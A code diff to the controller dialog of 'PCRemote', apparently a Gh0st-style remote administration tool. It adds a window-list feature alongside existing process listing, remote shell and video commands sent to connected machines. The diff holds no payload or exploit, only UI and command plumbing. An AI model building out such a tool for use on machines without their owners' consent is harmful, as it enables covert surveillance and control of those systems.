@@ -88,6 +88,7 @@ CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 	iCount = 0;
 	g_pPCRemoteDlg = this;
+	bWindows = FALSE;
 
 	if (((CPCRemoteApp*)AfxGetApp())->m_bIsQQwryExist)
 	{
@@ -252,6 +253,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;*/
 	case TOKEN_PSLIST:
 		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_WSLIST:
+		//AfxMessageBox("okk");
+		g_pPCRemoteDlg->pWindlg->ShowWindowsList();
 		break;
 	case TOKEN_SHELL_START:
 		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
@@ -649,6 +654,7 @@ void CPCRemoteDlg::OnOnlineProcess()
 {
 	// TODO: 在此添加命令处理程序代码
 	//MessageBox("进程管理");
+	bWindows = FALSE;
 	BYTE bToken = COMMAND_SYSTEM;
 	SendSelectCommand(&bToken, sizeof(BYTE));
 }
@@ -657,14 +663,13 @@ void CPCRemoteDlg::OnOnlineProcess()
 LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext*)lParam;
-	CSystemDlg *pDlg = new CSystemDlg(this, m_iocpServer, pContext);
-
+	CSystemDlg *pDlg = new CSystemDlg(this, m_iocpServer, pContext, bWindows);
+	pWindlg = pDlg;
 	pDlg->Create(IDD_SYSTEM, GetDesktopWindow());
 	pDlg->ShowWindow(SW_SHOW);
 
 	pContext->m_Dialog[0] = SYSTEM_DLG;
 	pContext->m_Dialog[1] = (int)pDlg;
-
 	return 0;
 }
 
@@ -693,7 +698,10 @@ void CPCRemoteDlg::OnOnlineVideo()
 void CPCRemoteDlg::OnOnlineWindow()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("窗口管理");
+	//MessageBox("窗口管理");
+	bWindows = TRUE;
+	BYTE bToken = COMMAND_SYSTEM;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
